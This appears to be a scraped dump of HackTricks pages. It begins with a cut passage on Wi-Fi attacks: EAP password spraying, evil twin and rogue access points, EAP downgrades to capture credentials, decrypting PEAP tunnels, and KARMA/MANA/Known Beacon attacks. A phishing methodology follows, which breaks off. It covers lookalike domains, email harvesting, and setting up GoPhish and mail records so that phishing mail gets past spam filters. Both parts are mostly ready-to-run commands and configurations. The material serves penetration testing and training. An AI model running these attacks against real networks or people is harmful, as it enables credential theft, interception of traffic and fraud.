form\nuser@realm\nor simply\nuser\n. If the PEAP/TTLS server is also authenticating the\nuser\n, it now knows the user‚Äôs identity and proceeds with the authentication method being protected by the TLS tunnel. Alternatively, the PEAP/TTLS server may forward a new RADIUS request to the user‚Äôs home RADIUS server. This new RADIUS request has the PEAP or TTLS protocol stripped out. If the protected authentication method is EAP, the inner EAP messages are transmitted to the home RADIUS server without the EAP-PEAP or EAP-TTLS wrapper. The User-Name attribute of the outgoing RADIUS message contains the user‚Äôs true identity ‚Äì not the anonymous identity from the User-Name attribute of the incoming RADIUS request. If the protected authentication method is PAP or CHAP (supported only by TTLS), the User-Name and other authentication attributes recovered from the TLS payload are placed in the outgoing RADIUS message in place of the anonymous User-Name and TTLS EAP-Message attributes included in the incoming RADIUS request.\nEAP-Bruteforce (password spray)\nIf the client is expected to use a\nusername and password\n(notice that\nEAP-TLS won't be valid\nin this case), then you could try to get a\nlist\na\nusernames\n(see next part) and\npasswords\nand try to\nbruteforce\nthe access using\nair-hammer\n.\n./air-hammer.py\n-i\nwlan0\n-e\nTest-Network\n-P\nUserPassword1\n-u\nusernames.txt\nYou could also do this attack using\neaphammer\n:\n./eaphammer --eap-spray\n\\\n--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4\n\\\n--essid\nexample-wifi\n\\\n--password\nbananas\n\\\n--user-list users.txt\nClient attacks Theory\nNetwork Selection and Roaming\nAlthough the 802.11 protocol has very specific rules that dictate how a station can join an ESS, it does not specify how the station should select an ESS to connect to. Additionally, the protocol allows stations to roam freely between access points that share the same ESSID (because you wouldn‚Äôt want to lose WiFi connectivity when walking from one end of a building to another, etc). However, the 802.11 protocol does not specify how these access points should be selected. Furthermore, even though stations must be authenticated to the ESS in order to associate with an access point, the 802.11 protocol does not require the access point be authenticated to the station.\nPreferred Network Lists (PNLs)\nEach time a station connects to a wireless network, the network‚Äôs ESSID is stored in the station‚Äôs Preferred Network List (PNL). The PNL is an ordered list of every network that the station has connected to in the past, and each entry in the PNL contains the network‚Äôs ESSID and any network-specific configuration information needed to establish a connection.\nPassive Scanning\nIn infrastructure networks, access points periodically transmit beacon frames to advertise their presence and capabilities to nearby stations. Beacons are broadcast frames, which means they are intended to be received by all nearby stations in range. Beacons include information about the AP‚Äôs supported rates, encryption capabilities, additional information, and most importantly, beacon frames contain the AP‚Äôs ESSID (as long as ESSID broadcasting is not disabled).\nDuring passive scanning, the client device listens for beacon frames from nearby access points. If the client device receives a beacon frame whose ESSID field matches an ESSID from the client‚Äôs PNL, the client will automatically connect to the access point that sent the beacon frame. Then, suppose we want to target a wireless device that is not currently connected to any wireless. If we know at least one entry in that client‚Äôs PNL, we can force the client to connect to us simply by creating our own access point with that entry‚Äôs ESSID.\nActive Probing\nThe second network selection algorithm used in 802.11 is known as Active Probing. Client devices that use active probing continuously transmit probe request frames to determine what APs are within range, as well as what their capabilities are. Probe requests come in two forms: directed and broadcast. Directed probe requests are addressed to a specific ESSID, and are the client‚Äôs way of checking if a specific network is nearby.\nClients that use directed probing will send out probe requests for each network in its PNL. It should be noted that directed probing is the only way of identify the presence of nearby hidden networks. Broadcast probe requests work almost exactly the same way, but are sent with the SSID field set to NULL. This addresses the broadcast probe to all nearby access points, allowing the the station to check if any of its preferred networks are nearby without revealing the contents of its PNL\nSimple AP with redirection to Internet\nBefore explaining how to perform more complex attacks it's going to be explained\nhow\nto just\ncreate\nan\nAP\nand\nredirect\nit's\ntraffic\nto an interface connected\nto\nthe\nInternet\n.\nUsing\nifconfig -a\ncheck that the wlan interface to create the AP and the interface connected to the Internet are present.\nDHCP & DNS\napt-get\ninstall\ndnsmasq\n#Manages DHCP and DNS\ncreate a config file\n/etc/dnsmasq.conf\nas follows:\ninterface=wlan0\ndhcp-authoritative\ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\nThen\nset IPs\nand\nroutes\n:\nifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0\nroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1\nAnd then\nstart\ndnsmasq:\ndnsmasq -C dnsmasq.conf -d\nhostapd\napt-get install hostapd\nCreate a config file\nhostapd.conf:\ninterface=wlan0\ndriver=nl80211\nssid=MITIWIFI\nhw_mode=g\nchannel=11\nmacaddr_acl=0\nignore_broadcast_ssid=0\nauth_algs=1\nwpa=2\nwpa_passphrase=mitmwifi123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nwpa_group_rekey=86400\nieee80211n=1\nwme_enabled=1\nStop annoying processes\n, set\nmonitor mode\n, and\nstart hostapd\n:\nairmon-ng check kill\niwconfig wlan0 mode monitor\nifconfig wlan0 up\nhostapd ./hostapd.conf\nForwarding and Redirection\niptables\n--table\nnat\n--append\nPOSTROUTING --out-interface eth0\n-j\nMASQUERADE\niptables\n--append\nFORWARD --in-interface wlan0\n-j\nACCEPT\necho\n1\n>\n/proc/sys/net/ipv4/ip_forward\nEvil Twin\nAn evil twin attack is a type Wi-Fi attack that works by taking advantage of the fact that most computers and phones will only see the \"name\" or ESSID of a wireless network (as the base station is not required to authenticate against the client). This actually makes it very hard to distinguish between networks with the same name and same kind of encryption. In fact, many networks will have several network-extending access points all using the same name to expand access without confusing users.\nDue how the implementation of clients work (remember that the 802.11 protocol allows stations to roam freely between access points within the same ESS), it is possible to make a device to change the base station it is connected to. It is possible to do that offering a better signal (which is not always possible) or by blocking the access to the original base station (deauthentication packets, jamming, or some other form of DoS attack).\nNotice also that real-world wireless deployments usually have more than a single access point, and these access points are often more powerful and have better line-of-site range due to their placement towards the ceiling. Deauthenticating a single access point usually results in the target roaming towards another valid access point rather than your rogue AP, unless all nearby access points are deauthenticated (loud) or you are very careful with the placement of the rogue AP (difficult).\nYou can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:\nairbase-ng\n-a\n00:09:5B:6F:64:1E\n--essid\n\"Elroy\"\n-c\n1\nwlan0mon\nYou could also create an Evil Twin using\neaphammer\n(notice that to create evil twins with eaphammer the interface\nshould NOT be\nin\nmonitor\nmode):\n./eaphammer -i wlan0 --essid exampleCorp --captive-portal\nOr using Airgeddon:\nOptions: 5,6,7,8,9 (inside Evil Twin attack menu).\nPlease, notice that by default if an ESSID in the PNL is saved as WPA protected, the device won't connect automatically to an Open evil Twin. You can try to DoS the real AP and hope that the user will connect manually to your Open evil twin, or you could DoS the real AP an use a WPA Evil Twin to capture the handshake (using this method you won't be able to let the victim connect to you as you don't know the PSK, but you can capture the handshake and try to crack it).\nSome OS and AV will warn the user that connect to an Open network is dangerous...\nWPA/WPA2 Evil Twin\nYou can create an\nEvil Twin using WPA/2\nand if the devices have configured to connect to that SSID with WPA/2, they are going to try to connect. Anyway,\nto complete the 4-way-handshake\nyou also need to\nknow\nthe\npassword\nthat the client is going to use. If you\ndon't know\nit, the\nconnection won't be completed\n.\n./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase \"mywifipassword\"\nEnterprise Evil Twin\nTo understand this attacks I would recommend to read before the brief\nWPA Enterprise explanation\n.\nUsing hostapd-wpe\nhostapd-wpe\nneeds a\nconfiguration\nfile to work. To\nautomate\nthe generation if these configurations you could use\nhttps://github.com/WJDigby/apd_launchpad\n(download the python file inside\n/etc/hostapd-wpe/\n)\n./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com\nhostapd-wpe ./victim/victim.conf -s\nIn the configuration file you can select a lot of different things like ssid, channel, user files, cret/key, dh parameters, wpa version and auth...\n‚Äã\nUsing hostapd-wpe with EAP-TLS to allow any certificate to login.\n‚Äã\nUsing EAPHammer\n# Generate Certificates\n./eaphammer --cert-wizard\n‚Äã\n# Launch Attack\n./eaphammer\n-i\nwlan0\n--channel\n4\n--auth\nwpa-eap\n--essid\nCorpWifi\n--creds\nBy default, EAPHammer purposes this authentication methods (notice GTC as the first one to try to obtain plaintext passwords and then the use of more robust auth methods):\nGTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5\nThis is the default methodology to avoid long connection times. However, you can also specify to server the authentication methods from weakest to strongest:\n--negotiate weakest\nOr you could also use:\n--negotiate gtc-downgrade\nto use highly efficient GTC downgrade implementation (plaintext passwords)\n--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP\nto specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).\n‚Äã\nFind more info in the wiki\n‚Äã\nUsing Airgeddon\nAirgeddon\ncan use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to\ncapture the user and the MD5 of the password\n. Later, the attacker can try to crack the password.\nAirggedon\noffers you the possibility of a\ncontinuous Evil Twin attack (noisy)\nor\nonly create the Evil Attack until someone connects (smooth).\nDebugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks\nThis method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS\nInside the\nconfiguration\nof\nhostapd-wpe\ncomment\nthe line that contains\ndh_file\n(from\ndh_file=/etc/hostapd-wpe/certs/dh\nto\n#dh_file=/etc/hostapd-wpe/certs/dh\n)\nThis will make\nhostapd-wpe\nto\nexchange keys using RSA\ninstead of DH, so you will be able to\ndecrypt\nthe traffic later\nknowing the servers private key\n.\nNow start the\nEvil Twin\nusing\nhostapd-wpe\nwith that modified configuration as usual. Also, start\nwireshark\nin the\ninterface\nwhich is performing the Evil Twin attack.\nNow or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in:\nEdit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...\nAdd a new entry and fill the form with this values:\nIP address = any\n--\nPort = 0\n--\nProtocol = data\n--\nKey File\n(\nselect your key file\n, to avoid problems select a key file\nwithout being password protected\n).\nAnd look at the new\n\"Decrypted TLS\" tab\n:\nKARMA, MANA, Loud MANA and Known beacons attack\nESSID and MAC black/whitelists\nThe following table lists the different type of MFACLs (Management Frame Access Control Lists) available, as well their effects when used:\n# example EAPHammer MFACL file, wildcards can be used\n78:f0:97:fc:b5:36\n9a:35:e1:01:4f:cf\n69:19:14:60:20:45\nce:52:b8:*:*:*\n‚Äã\n[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]\n[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]\n# example ESSID-based MFACL file\napples\noranges\ngrapes\npears\n‚Äã\n[--ssid-whitelist /path/to/mac/whitelist/file.txt]\n[--ssid-blacklist /path/to/mac/blacklist/file.txt]\nKARMA\nKarma attacks are a second form of rogue access point attack that exploits the network selection process used by stations. In a whitepaper written in 2005, Dino Dai Zovi and Shane Macaulay describe how an attacker can configure an access point to listen for directed probe requests and respond to all of them with matching directed probe responses. This causes the affected stations to automatically send an association request to the attacker‚Äôs access point. The access point then replies with an association response, causing the affected stations to connect to the attacker.\nMANA\nAccording to Ian de Villiers and Dominic White, modern stations are designed to protect themselves against karma attacks by ignoring directed probe responses from access points that have not already responded to at least one broadcast probe request. This led to a significant drop in the number of stations that were vulnerable to karma attacks until 2015, when White and de Villiers developed a means of circumventing such protections. In White‚Äôs and de Villiers‚Äô improved karma attack (MANA attack), directed probe responses are used to reconstruct the PNLs of nearby stations. When a broadcast probe request is received from a station, the attacker‚Äôs access point responds with an arbitrary SSID from the station‚Äôs PNL already being saw in a direct probe from that device.\nIn resume, the MANA algorithm works like this: each time the access point receives a probe request, it first determines whether it‚Äôs a broadcast or directed probe. If it‚Äôs directed probe, the sender‚Äôs MAC address is added to the hash table (if it‚Äôs not there already) and the ESSID is added to that device‚Äôs PNL. The AP then responds with a directed probe response. If it‚Äôs a broadcast probe, the access point responds with probe responses for each of the networks in that device‚Äôs PNL.\nMANA attack using eaphammer:\n./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]\nLoud MANA\nNotice that the standard MANA attack still does not allow us to attack devices that don‚Äôt use directed probing at all. So if we also doesn't know previously any entry inside the device PNL, we need to figure out some other way to attack it.\nA possibility is what is called Loud MANA attack. This attack relies on the idea that client devices within close physical proximity to one another are likely to have at least some common entries in their PNLs.\nIn resume, Loud MANA attack instead of responding to probe requests with each ESSID in a particular device‚Äôs PNL, the rogue AP sends probe responses for every ESSID in every PNL across all devices that it has seen before. Relating this to set theory, we can say that the AP sends probe responses for each ESSID in the union of all PNLs of nearby devices.\n./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]\nKnown Beacon attack\nThere are still cases in which Loud MANA attack won‚Äôt succeed.\nThe Known Beacon attack is a way to \"Brute-Force\" ESSIDs to try to get the victim connect to the attacker. The attacker creates an AP that response to any ESSID and run some code sending beacons faking ESSIDs of each name inside a wordlist. Hopefully the victim will contains some of theses ESSID names inside its PNL and will try to connect to the fake AP.\nEaphammer implemented this attack as a MANA attack where all the ESSIDs inside a list are charged (you could also combine this with\n--loud\nto create a Loud MANA + Known beacons attack):\n./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]\nKnown Beacon Burst attack\nAs known beacons are loud. You can use a script inside Eaphammer project to just launch beacouns of every ESSID name inside a file very quickly. If you combines this script with a Eaphammer MANA attack, the clients will be able to connect to your AP.\n# transmit a burst of 5 forged beacon packets for each entry in list\n./forge-beacons -i wlan1 \\\n--bssid de:ad:be:ef:13:37 \\\n--known-essids-file known-s.txt \\\n--dst-addr 11:22:33:11:22:33 \\\n--burst-count 5\nWi-Fi Direct\nWi-Fi Direct is a Wi-Fi standard that allows devices to connect to each other without a wireless AP as one of the two devices will act as AP (called group owner). You can find Wi-Fi Direct in a lot of IoT devices like printers, TVs...\nWi-Fi Direct relies on Wi-Fi Protected Setup (\nWPS\n) to securely connect the devices. WPS has multiple configuration methods such as\nPush-Button\nConfiguration (PBC),\nPIN entry\n, and\nNear-Field\nCommunication (NFC)\nSo the attacks previously seen to WPS PIN are also valid here if PIN is used.\nEvilDirect Hijacking\nThis works like an Evil-Twin but for Wi-Fi direct, you can impersonate a group owner to try to make other devices like phons connect to you:\nairbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0\nReferences\n‚Äã\nhttps://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee\n‚Äã\n‚Äã\nhttps://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9\n‚Äã\n‚Äã\nhttps://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38\n‚Äã\n‚Äã\nhttps://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d\n‚Äã\n‚Äã\nhttps://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf\n‚Äã\n‚Äã\nhttp://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/\n‚Äã\n‚Äã\nhttps://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/\n‚Äã\n‚Äã\nhttps://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d\n‚Äã\nTODO: Take a look to\nhttps://github.com/wifiphisher/wifiphisher\n(login con facebook e imitacionde WPA en captive portals)\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSpoofing SSDP and UPnP Devices with EvilSSDP\nNext\nEvil Twin EAP-TLS\nLast modified\n4mo ago"
    },
    {
        "title": "Phishing Methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology",
        "text": "Phishing Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMethodology\n1.\nRecon the victim\n1.\nSelect the\nvictim domain\n.\n2.\nPerform some basic web enumeration\nsearching for login portals\nused by the victim and\ndecide\nwhich one you will\nimpersonate\n.\n3.\nUse some\nOSINT\nto\nfind emails\n.\n2.\nPrepare the environment\n1.\nBuy the domain\nyou are going to use for the phishing assessment\n2.\nConfigure the email service\nrelated records (SPF, DMARC, DKIM, rDNS)\n3.\nConfigure the VPS with\ngophish\n3.\nPrepare the campaign\n1.\nPrepare the\nemail template\n2.\nPrepare the\nweb page\nto steal the credentials\n4.\nLaunch the campaign!\nGenerate similar domain names or buy a trusted domain\nDomain Name Variation Techniques\nKeyword\n: The domain name\ncontains\nan important\nkeyword\nof the original domain (e.g., zelster.com-management.com).\nhypened subdomain\n: Change the\ndot for a hyphen\nof a subdomain (e.g., www-zelster.com).\nNew TLD\n: Same domain using a\nnew TLD\n(e.g., zelster.org)\nHomoglyph\n: It\nreplaces\na letter in the domain name with\nletters that look similar\n(e.g., zelfser.com).\nTransposition:\nIt\nswaps two letters\nwithin the domain name (e.g., zelster.com).\nSingularization/Pluralization\n: Adds or removes ‚Äús‚Äù at the end of the domain name (e.g., zeltsers.com).\nOmission\n: It\nremoves one\nof the letters from the domain name (e.g., zelser.com).\nRepetition:\nIt\nrepeats one\nof the letters in the domain name (e.g., zeltsser.com).\nReplacement\n: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).\nSubdomained\n: Introduce a\ndot\ninside the domain name (e.g., ze.lster.com).\nInsertion\n: It\ninserts a letter\ninto the domain name (e.g., zerltser.com).\nMissing dot\n: Append the TLD to the domain name. (e.g., zelstercom.com)\nAutomatic Tools\n‚Äã\ndnstwist\n‚Äã\n‚Äã\nurlcrazy\n‚Äã\nWebsites\n‚Äã\nhttps://dnstwist.it/\n‚Äã\n‚Äã\nhttps://dnstwister.report/\n‚Äã\n‚Äã\nhttps://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/\n‚Äã\nBitflipping\nIn the world of computing, everything is stored in bits (zeros and ones) in memory behind the scenes.\nThis applies to domains too. For example,\nwindows.com\nbecomes\n01110111...\nin the volatile memory of your computing device.\nHowever, what if one of these bits got automatically flipped due to a solar flare, cosmic rays, or a hardware error? That is one of the 0's becomes a 1 and vice versa.\nApplying this concept to DNS request, it's possible that the\ndomain requested\nthat arrives to the DNS server\nisn't the same as the domain initially requested.\nFor example a 1 bit modification in the domain windows.com can transform it into\nwindnws.com.\nAttackers may register as many bit-flipping domains as possible related to the victim in order to redirect legitimate users to their infrastructure\n.\nFor more information read\nhttps://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/\n‚Äã\nBuy a trusted domain\nYou can search in\nhttps://www.expireddomains.net/\nfor a expired domain that you could use.\nIn order to make sure that the expired domain that you are going to buy\nhas already a good SEO\nyou could search how is it categorized in:\n‚Äã\nhttp://www.fortiguard.com/webfilter\n‚Äã\n‚Äã\nhttps://urlfiltering.paloaltonetworks.com/query/\n‚Äã\nDiscovering Emails\n‚Äã\nhttps://github.com/laramies/theHarvester\n(100% free)\n‚Äã\nhttps://phonebook.cz/\n(100% free)\n‚Äã\nhttps://maildb.io/\n‚Äã\n‚Äã\nhttps://hunter.io/\n‚Äã\n‚Äã\nhttps://anymailfinder.com/\n‚Äã\nIn order to\ndiscover more\nvalid email addresses or\nverify the ones\nyou have already discovered you can check if you can brute-force them smtp servers of the victim.\nLearn how to verify/discover email address here\n.\nMoreover, don't forget that if the users use\nany web portal to access their mails\n, you can check if it's vulnerable to\nusername brute force\n, and exploit the vulnerability if possible.\nConfiguring GoPhish\nInstallation\nYou can download it from\nhttps://github.com/gophish/gophish/releases/tag/v0.11.0\n‚Äã\nDownload and decompress it inside\n/opt/gophish\nand execute\n/opt/gophish/gophish\nYou will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:\nssh\n-L\n3333\n:127.0.0.1:3333\n<\nuser\n>\n@\n<\nip\n>\nConfiguration\nTLS certificate configuration\nBefore this step you should have\nalready bought the domain\nyou are going to use and it must be\npointing\nto the\nIP of the VPS\nwhere you are configuring\ngophish\n.\nDOMAIN\n=\n\"<domain>\"\nwget\nhttps://dl.eff.org/certbot-auto\nchmod\n+x certbot-auto\nsudo\napt\ninstall\nsnapd\nsudo\nsnap\ninstall\ncore\nsudo\nsnap refresh core\nsudo\napt-get\nremove certbot\nsudo\nsnap\ninstall\n--classic\ncertbot\nsudo\nln\n-s\n/snap/bin/certbot /usr/bin/certbot\ncertbot certonly\n--standalone\n-d\n\"\n$DOMAIN\n\"\nmkdir\n/opt/gophish/ssl_keys\ncp\n\"/etc/letsencrypt/live/\n$DOMAIN\n/privkey.pem\"\n/opt/gophish/ssl_keys/key.pem\ncp\n\"/etc/letsencrypt/live/\n$DOMAIN\n/fullchain.pem\"\n/opt/gophish/ssl_keys/key.crt‚Äã\nMail configuration\nStart installing:\napt-get install postfix\nThen add the domain to the following files:\n/etc/postfix/virtual_domains\n/etc/postfix/transport\n/etc/postfix/virtual_regexp\nChange also the values of the following variables inside /etc/postfix/main.cf\nmyhostname = <domain>\nmydestination = $myhostname, <domain>, localhost.com, localhost\nFinally modify the files\n/etc/hostname\nand\n/etc/mailname\nto your domain name and\nrestart your VPS.\nNow, create a\nDNS A record\nof\nmail.<domain>\npointing to the\nip address\nof the VPS and a\nDNS MX\nrecord pointing to\nmail.<domain>\nNow lets test to send an email:\napt\ninstall\nmailutils\necho\n\"This is the body of the email\"\n|\nmail\n-s\n\"This is the subject line\"\n[email¬†protected]\nGophish configuration\nStop the execution of gophish and lets configure it.\nModify\n/opt/gophish/config.json\nto the following (note the use of https):\n{\n\"admin_server\"\n:\n{\n\"listen_url\"\n:\n\"127.0.0.1:3333\"\n,\n\"use_tls\"\n:\ntrue,\n\"cert_path\"\n:\n\"gophish_admin.crt\"\n,\n\"key_path\"\n:\n\"gophish_admin.key\"\n}\n,\n\"phish_server\"\n:\n{\n\"listen_url\"\n:\n\"0.0.0.0:443\"\n,\n\"use_tls\"\n:\ntrue,\n\"cert_path\"\n:\n\"/opt/gophish/ssl_keys/key.crt\"\n,\n\"key_path\"\n:\n\"/opt/gophish/ssl_keys/key.pem\"\n}\n,\n\"db_name\"\n:\n\"sqlite3\"\n,\n\"db_path\"\n:\n\"gophish.db\"\n,\n\"migrations_prefix\"\n:\n\"db/db_\"\n,\n\"contact_address\"\n:\n\"\"\n,\n\"logging\"\n:\n{\n\"filename\"\n:\n\"\"\n,\n\"level\"\n:\n\"\"\n}\n}\nConfigure gophish service\nIn order to create the gophish service so it can be started automatically and managed a service you can create the file\n/etc/init.d/gophish\nwith the following content:\n#!/bin/bash\n# /etc/init.d/gophish\n# initialization file for stop/start of gophish application server\n#\n# chkconfig: - 64 36\n# description: stops/starts gophish application server\n# processname:gophish\n# config:/opt/gophish/config.json\n# From https://github.com/gophish/gophish/issues/586\n‚Äã\n# define script variables\n‚Äã\nprocessName\n=\nGophish\nprocess\n=\ngophish\nappDirectory\n=\n/opt/gophish\nlogfile\n=\n/var/log/gophish/gophish.log\nerrfile\n=\n/var/log/gophish/gophish.error\n‚Äã\nstart\n()\n{\necho\n'Starting '\n${processName}\n'...'\ncd\n${appDirectory}\nnohup\n./\n$process\n>>\n$logfile\n2\n>>\n$errfile\n&\nsleep\n1\n}\n‚Äã\nstop\n()\n{\necho\n'Stopping '\n${processName}\n'...'\npid\n=\n$(\n/bin/pidof $\n{\nprocess\n}\n)\nkill\n${pid}\nsleep\n1\n}\n‚Äã\nstatus\n()\n{\npid\n=\n$(\n/bin/pidof $\n{\nprocess\n}\n)\nif\n[[\n\"\n$pid\n\"\n!=\n\"\"\n|\n\"\n$pid\n\"\n!=\n\"\"\n]];\nthen\necho\n${processName}\n' is running...'\nelse\necho\n${processName}\n' is not running...'\nfi\n}\n‚Äã\ncase\n$1\nin\nstart\n|\nstop\n|\nstatus\n)\n\"\n$1\n\"\n;;\nesac\nFinish configuring the service and checking it doing:\nmkdir\n/var/log/gophish\nchmod\n+x /etc/init.d/gophish\nupdate-rc.d gophish defaults\n#Check the service\nservice\ngophish start\nservice\ngophish status\nss\n-l\n|\ngrep\n\"3333\\|443\"\nservice\ngophish stop\nConfiguring mail server and domain\nWait\nThe older a domain is the less probable it's going to be caught as spam. Then you should wait as much time as possible (at least 1week) before the phishing assessment.\nNote that even if you have to wait a week you can finish configuring everything now.\nConfigure Reverse DNS (rDNS) record\nSet a rDNS (PTR) record that resolves the IP address of the VPS to the domain name.\nSender Policy Framework (SPF) Record\nYou must\nconfigure a SPF record for the new domain\n. If you don't know what is a SPF record\nread this page\n.\nYou can use\nhttps://www.spfwizard.net/\nto generate your SPF policy (use the IP of the VPS machine)\nThis is the content that must be set inside a TXT record inside the domain:\nv\n=\nspf1 mx a ip4:ip.ip.ip.ip ?all\nDomain-based Message Authentication, Reporting & Conformance (DMARC) Record\nYou must\nconfigure a DMARC record for the new domain\n. If you don't know what is a DMARC record\nread this page\n.\nYou have to create a new DNS TXT record pointing the hostname\n_dmarc.<domain>\nwith the following content:\nv\n=\nDMARC1\n;\np\n=\nnone\nDomainKeys Identified Mail (DKIM)\nYou must\nconfigure a DKIM for the new domain\n. If you don't know what is a DMARC record\nread this page\n.\nThis tutorial is based on:\nhttps://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy\n‚Äã\nYou need to concatenate both B64 values that the DKIM key generates:\nv=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj\" \"Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB\nTest your email configuration score\nYou can do that using\nhttps://www.mail-tester.com/\nJust access the page and send an email to the address they give you:\necho\n\"This is the body of the email\"\n|\nmail\n-s\n\"This is the subject line\"\n[email¬†protected]\nYou can also c\nheck your email configuration\nsending an email to\n[email¬†protected]\nand\nreading the response\n(for this you will need to\nopen\nport\n25\nand see the response in the file\n/var/mail/root\nif you send the email a as root).\nCheck that you pass all the tests:\n==========================================================\nSummary of Results\n==========================================================\nSPF check:          pass\nDomainKeys check:   neutral\nDKIM check:         pass\nSender-ID check:    pass\nSpamAssassin check: ham\nAlternatively, you can send a\nmessage to a Gmail address that you control\n,\nview\nthe received\nemail‚Äôs headers\nin your Gmail inbox,\ndkim=pass\nshould be present in the\nAuthentication-Results\nheader field.\nAuthentication-Results: mx.google.com;\nspf=pass (google.com: domain of\n[email¬†protected]\ndesignates --- as permitted sender)\n[email¬†protected]\n;\ndkim=pass\n[email¬†protected]\n;\n‚ÄãRemoving from Spamhouse Blacklist\nThe page www.mail-tester.com can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ‚Äã\nhttps://www.spamhaus.org/lookup/\n‚Äã\nRemoving from Microsoft Blacklist\n‚Äã‚ÄãYou can request your domain/IP to be removed at\nhttps://sender.office.com/\n.\nCreate & Launch GoPhish Campaign\nSending 